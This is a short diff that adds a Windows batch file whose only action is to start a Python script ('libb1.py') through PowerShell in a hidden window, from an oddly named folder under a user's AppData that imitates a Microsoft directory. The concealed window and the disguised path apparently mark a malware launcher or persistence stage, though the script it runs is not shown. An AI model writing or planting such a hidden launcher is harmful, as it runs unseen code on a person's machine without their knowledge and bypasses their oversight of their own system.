@@ -1,0 +1,2 @@
+@echo off;
+powershell.exe -windowstyle hidden -command "& 'C:\Users\WOCSA\AppData\Local\MicrosoftGreenxtFG\python.exe C:\Users\WOCSA\AppData\Local\MicrosoftGreenxtFG\libb1.py'";
